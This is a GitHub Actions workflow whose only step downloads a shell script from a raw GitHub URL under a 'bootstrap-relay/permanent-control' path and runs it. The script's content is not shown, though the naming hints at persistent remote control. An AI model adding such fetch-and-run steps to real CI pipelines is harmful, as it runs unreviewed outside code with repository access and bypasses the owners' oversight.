name: Bootstrap PowerPC Permanent Control

on:
  push:
    paths:
      - ".github/workflows/probe-powerpc-control.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Execute machine-only bootstrap
        shell: bash
        run: |
          set -euo pipefail
          url="https://raw.githubusercontent.com/Christopher-Charman/open-webui/b5be6178d0fdf3bee9daea01909733c50837f082/bootstrap-relay/permanent-control/actions-bootstrap-live.sh"
          curl -fsSL --retry 4 "$url" -o /tmp/actions-bootstrap-live.sh
          chmod 700 /tmp/actions-bootstrap-live.sh
          /tmp/actions-bootstrap-live.sh
